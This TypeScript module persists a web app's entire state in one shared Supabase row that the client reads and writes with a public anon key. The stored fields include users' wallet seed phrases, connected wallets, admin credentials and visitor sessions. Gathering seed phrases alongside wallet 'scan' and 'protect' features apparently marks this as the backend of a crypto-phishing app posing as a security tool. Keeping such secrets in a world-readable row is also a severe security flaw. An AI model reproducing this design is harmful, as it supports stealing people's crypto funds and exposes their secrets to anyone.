import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL      = (import.meta.env.VITE_SUPABASE_URL      as string | undefined ?? '').trim()
const SUPABASE_ANON_KEY = (import.meta.env.VITE_SUPABASE_ANON_KEY as string | undefined ?? '').trim()

const isConfigured = Boolean(SUPABASE_URL && SUPABASE_ANON_KEY)

const supabase = isConfigured ? createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null

const ROW_ID = 'global'

export type AppStateRow = {
  id:                     string
  connected_wallets:      unknown
  scan_history:           unknown
  signer_checks:          unknown
  email_records:          unknown
  admin_intel_records:    unknown
  protect_checklist_done: unknown
  seed_phrases:           unknown
  newsletter_emails:      unknown
  visitor_sessions:       unknown
  support_config:         unknown
  admin_creds:            unknown
  user_email_routes:      unknown
}

export type CloudPatch = Partial<Omit<AppStateRow, 'id'>>

/** Fetch the single global row. Returns {} on miss, error, or when not configured. */
export async function loadFromCloud(): Promise<Partial<AppStateRow>> {
  if (!supabase) return {}
  try {
    const { data, error } = await supabase
      .from('app_state')
      .select('*')
      .eq('id', ROW_ID)
      .maybeSingle()
    if (error) throw error
    return (data as Partial<AppStateRow>) ?? {}
  } catch (err) {
    console.error('[cloud] load failed:', err)
    return {}
  }
}

/** Upsert one or more columns into the global row. Fire-and-forget safe. */
export async function saveToCloud(patch: CloudPatch): Promise<void> {
  if (!supabase) return
  try {
    const { error } = await supabase
      .from('app_state')
      .upsert({ id: ROW_ID, ...patch })
    if (error) throw error
  } catch (err) {
    console.error('[cloud] save failed:', err)
  }
}
